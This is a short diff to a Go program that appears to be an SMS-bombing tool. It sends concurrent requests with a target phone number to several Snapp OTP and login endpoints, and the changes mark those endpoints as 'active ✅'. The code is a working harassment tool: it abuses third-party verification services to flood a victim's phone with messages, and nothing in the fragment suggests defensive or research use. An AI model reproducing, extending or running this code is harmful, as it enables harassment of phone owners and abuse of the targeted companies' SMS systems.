@@ -293,12 +293,12 @@ func main() {
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// api.snapp.ir sms/link (JSON)
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 			"phone": phone,
-		}, &wg, ch)
+		}, &wg, ch)  // active ✅
 		// api.snapp.market loginMobileWithNoPass (JSON - adjusted payload format)
 		wg.Add(1)
 		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
@@ -384,7 +384,6 @@ func main() {
 		go sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
 			"cellphone": phone,
 		}, &wg, ch)
-
 		// Original Snappfood form request (kept for reference/comparison)
 		 wg.Add(1)
 		 go func(p string) {
